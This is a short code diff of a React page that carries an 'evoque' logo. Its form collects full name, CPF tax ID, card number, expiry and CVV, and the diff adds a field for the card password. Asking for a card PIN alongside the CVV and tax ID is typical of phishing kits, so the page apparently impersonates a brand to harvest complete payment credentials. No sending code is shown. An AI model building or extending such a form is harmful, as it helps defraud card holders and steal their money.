@@ -10,15 +10,15 @@ import evoqueLogo from '@/assets/evoque-logo.webp';
 
 const Index = () => {
   const navigate = useNavigate();
-  const [isModalOpen, setIsModalOpen] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false);
   const [formData, setFormData] = useState({
     nomeCompleto: '',
     cpf: '',
     numeroCartao: '',
     validade: '',
     cvv: '',
+    senhaCartao: '',
   });
-  const [isSubmitting, setIsSubmitting] = useState(false);
 
   const formatCPF = (value: string) => {
     const numbers = value.replace(/\D/g, '');
